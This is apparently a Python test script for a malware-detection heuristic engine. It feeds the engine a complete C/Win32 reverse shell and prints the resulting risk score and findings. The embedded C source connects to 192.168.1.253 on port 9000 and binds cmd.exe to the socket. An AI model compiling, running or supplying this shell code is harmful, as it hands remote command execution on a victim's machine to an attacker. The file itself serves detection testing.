"""Test the heuristic engine against the exact C/Win32 reverse shell the user tested."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.llm_analyzer import _fallback_analysis

# The exact payload the user put in their test file
c_reverse_shell = r"""
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.1.253"; 
char port[6] = "9000";            

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
"""

r = _fallback_analysis("test.txt", "modified", c_reverse_shell)
print(f"Priority:  {r['priority'].upper()}")
print(f"Score:     {r['risk_score']}")
print(f"Malicious: {r['is_malicious']}")
print(f"Reasoning: {r['reasoning']}")
print()
print("All findings:")
for f in r.get('findings', []):
    print(f"  [{f['severity']:2d}] {f['category']:20s} - {f['description']}")
